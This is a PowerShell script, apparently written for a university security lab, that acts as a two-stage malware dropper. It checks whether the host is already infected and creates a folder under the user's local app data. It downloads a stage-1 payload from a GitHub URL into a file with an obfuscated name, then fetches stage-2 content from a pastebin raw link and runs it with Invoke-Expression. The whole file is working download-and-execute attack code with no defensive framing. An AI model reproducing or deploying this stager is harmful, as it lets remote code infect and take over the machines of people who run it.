# Define the stage 1 path and file name
$targetPath = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Payloads"
$stage1File = Join-Path -Path $targetPath -ChildPath "p4y104d.ps1"
$stage1Url = "https://github.com/kwafula/kwafula.github.io/blob/main/CSC846-Lab08/p4y104d.ps1"

# Check if host is already infected
if (Test-Path -Path $stage1File -PathType Leaf) {
    # Debug Code: Write-Host "File already exists at $stage1File. Exiting script."
    exit
}
# If the file doesn't exist, create the directory if necessary
else  {
    if (-not (Test-Path -Path $targetPath -PathType Container)) {
        # Debug Code: Write-Host "Directory not found. Creating $targetPath..."
        New-Item -Path $targetPath -ItemType Directory | Out-Null
    }
    
    # Download stage 1 and write it to the file be executed by exploit kit
    try {
        # Debug Code: Write-Host "File not found. Downloading content from $sourceUrl..."
        $content = Invoke-WebRequest -Uri $stage1Url -UseBasicParsing
        $content.Content | Out-File -FilePath $stage1File -Encoding UTF8
        # Debug Code: Write-Host "Content successfully written to $stage1File."
    }
    catch {
        # Debug Code: Write-Error "An error occurred during download or file writing: $_"
        exit
    }
    
    # Download and execute stage 2 base64 encoded content payload
    try  {
      $stage2Url = "https://pastebin.com/raw/y9CNLxq6" 
      $stage2 = Invoke-RestMethod -Uri $stage2Url
      Invoke-Expression $stage2
    }
    catch  {
        # Debug Code: Write-Error "An error occurred during download: $_"
        exit
    }
}
